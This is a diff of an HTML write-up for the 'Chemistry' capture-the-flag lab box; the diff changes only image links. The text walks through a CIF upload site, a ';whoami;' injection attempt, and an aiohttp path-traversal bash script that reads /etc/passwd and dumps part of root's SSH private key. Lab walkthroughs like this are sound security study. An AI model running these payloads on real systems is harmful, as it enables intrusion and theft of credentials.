@@ -76,11 +76,11 @@ PORT     STATE SERVICE VERSION
 |     <span class="hljs-type">&lt;div</span> class=<span class="hljs-string">"container"</span>&gt;
 |     <span class="hljs-type">class</span>=<span class="hljs-string">"title"</span>&gt;Chemistry CIF Analyzer&lt;/h1&gt;
 |     <span class="hljs-type">&lt;p</span>&gt;Welcome to the Chemistry CIF Analyzer. This tool allows you to upload a CIF (Crystallographic Information <span class="hljs-keyword">File</span>) and analyze the structural data contained within.&lt;/p&gt;</code></pre></div>
-<p><img src="/_resources/cc8668f916934b40b40729f9588bdcf1.png" /></p>
+<p><img src=":/cc8668f916934b40b40729f9588bdcf1" alt="9f3b625ee1651d05469ed53dd3a18b18.png" /></p>
 <h1 id="chemistry-cif-analyzer">Chemistry CIF Analyzer</h1>
 <p>Using Register we can create new account and get access to the dashboard with upload functionality.</p>
-<p><img src="/_resources/b1739f78bf694e81ba1c2c69f06cfa42.png" /></p>
-<p><img src="/_resources/10fa0230aee543a198e1ec2cc026ea65.png" /></p>
+<p><img src=":/b1739f78bf694e81ba1c2c69f06cfa42" alt="9540c144120371af626b0bf83b71065e.png" /></p>
+<p><img src=":/10fa0230aee543a198e1ec2cc026ea65" alt="caf9bbfdcd475ee0930016e93eb14154.png" /></p>
 <p>It allows us only to upload only .cif files, i.e:</p>
 <div><pre class="hljs"><code><span class="hljs-attribute">data_Example</span>
 <span class="hljs-attribute">_cell_length_a</span>    <span class="hljs-number">10</span>.<span class="hljs-number">00000</span>
@@ -99,7 +99,7 @@ PORT     STATE SERVICE VERSION
  <span class="hljs-attribute">H</span> <span class="hljs-number">0</span>.<span class="hljs-number">00000</span> <span class="hljs-number">0</span>.<span class="hljs-number">00000</span> <span class="hljs-number">0</span>.<span class="hljs-number">00000</span> <span class="hljs-number">1</span>
  <span class="hljs-attribute">O</span> <span class="hljs-number">0</span>.<span class="hljs-number">50000</span> <span class="hljs-number">0</span>.<span class="hljs-number">50000</span> <span class="hljs-number">0</span>.<span class="hljs-number">50000</span> <span class="hljs-number">1</span></code></pre></div>
 <p>We can then proces this file by pressing View.</p>
-<p><img src="/_resources/14b87add442342299c81cbbaecda8d5a.png" /></p>
+<p><img src=":/14b87add442342299c81cbbaecda8d5a" alt="2bd04f7701c0915c9bdba3d71956cc4f.png" /></p>
 <p>Uploading any other file type is blocked. We can however change content-type, but any other file makes the site crash. I tried adding <code>;whoami;</code> at the end of cell_length, so that it is processed, but that it also causes the site to crash.</p>
 <p>Let’s try to understand how it is processed then. Reading more about our example file, it turns out that it is a <a title="https://en.wikipedia.org/wiki/Crystallographic_Information_File" href="https://en.wikipedia.org/wiki/Crystallographic_Information_File">standard for representing crystallographic information</a>.</p>
 <div><pre class="hljs"><code>$whatweb http://10.129.231.170:5000/
@@ -161,13 +161,13 @@ tcp       <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 <
 tcp       <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
 tcp       <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
 tcp6      <span class="hljs-number"> 0 </span>    <span class="hljs-number"> 0 </span>:::22                   :::*                    LISTEN      -                   </code></pre></div>
-<p><img src="/_resources/d081e26f1548428ab5b8812b9ef19f33.png" /></p>
+<p><img src=":/d081e26f1548428ab5b8812b9ef19f33" alt="e6164bef6659052ebbd74aa8006a152c.png" /></p>
 <p>We can see that the site is also run by root.<br />
 <code>root        1036  0.0  1.4 331388 28560 ?        Ssl  11:05   0:00 /usr/bin/python3.9 /opt/monitoring_site/app.py</code></p>
 <div><pre class="hljs"><code><span class="hljs-variable">$whatweb</span> http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8080</span>/
 http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8080</span><span class="hljs-regexp">/ [200 OK] HTML5, HTTPServer[Python/3.9 aiohttp/3.9.1], IP[::1], JQuery[3.6.0], Script, Title[Site Monitoring]</span></code></pre></div>
 <p>It seems that aiohttp has a <a title="https://github.com/advisories/GHSA-5h86-8mv2-jq9f" href="https://github.com/advisories/GHSA-5h86-8mv2-jq9f">vulnerability</a>, simple path travelsal. Someone even created a <a title="https://raw.githubusercontent.com/z3rObyte/CVE-2024-23334-PoC/refs/heads/main/exploit.sh" href="https://raw.githubusercontent.com/z3rObyte/CVE-2024-23334-PoC/refs/heads/main/exploit.sh">simple script</a> for testing it. It does not work, but looking at the site’s source, we can see it’s file files it’s referencing. Modifing it to check starting with <code>/assets</code>, get’s us passwd.</p>
-<p><img src="/_resources/3c05302f45f441fc8aa5c4945b4261d5.png" /></p>
+<p><img src=":/3c05302f45f441fc8aa5c4945b4261d5" alt="9da09f587d1ca59ed90fa5ea84e49e21.png" /></p>
 <div><pre class="hljs"><code><span class="hljs-meta">#!/bin/bash</span>
 
 url=<span class="hljs-string">"http://localhost:8080/assets"</span>
@@ -186,7 +186,7 @@ file=<span class="hljs-string">"etc/passwd"</span> <span class="hljs-comment"># 
         <span class="hljs-built_in">break</span>
     <span class="hljs-keyword">fi</span>
 <span class="hljs-keyword">done</span></code></pre></div>
-<p><img src="/_resources/80de985257ef4720af97904ef25058e4.png" /></p>
+<p><img src=":/80de985257ef4720af97904ef25058e4" alt="e0627833f9e37672162bd1c5f42a74a7.png" /></p>
 <p>We can modify the script to get root ssh.</p>
 <div><pre class="hljs"><code>└──╼ $./exploit.sh 
 [+] Testing with <span class="hljs-regexp">/static/</span>..<span class="hljs-regexp">/root/</span>.ssh/id_rsa
@@ -209,7 +209,7 @@ ATj++Xrpmmh9uR1HdS1XvD7glEFqNbYo3Q/OhiMto1JFqgWugeHm715yDnB3A+og4SFzrE
 vrLegAOwvNlDYGjJWnTqEmUDk9ruO4Eq4ad1TYMbAAAFiPikP5X4pD+VAAAAB3NzaC1yc2
 &lt;SNIP&gt;</code></pre></div>
 <p>Log in and we are done.</p>
-<p><img src="/_resources/d372c4ddddd045dd8eef1047fbd137a0.png" /></p>
+<p><img src=":/d372c4ddddd045dd8eef1047fbd137a0" alt="c8b2a3317633536f83708a08f6837808.png" /></p>
 </div>
       </article>
     </div>
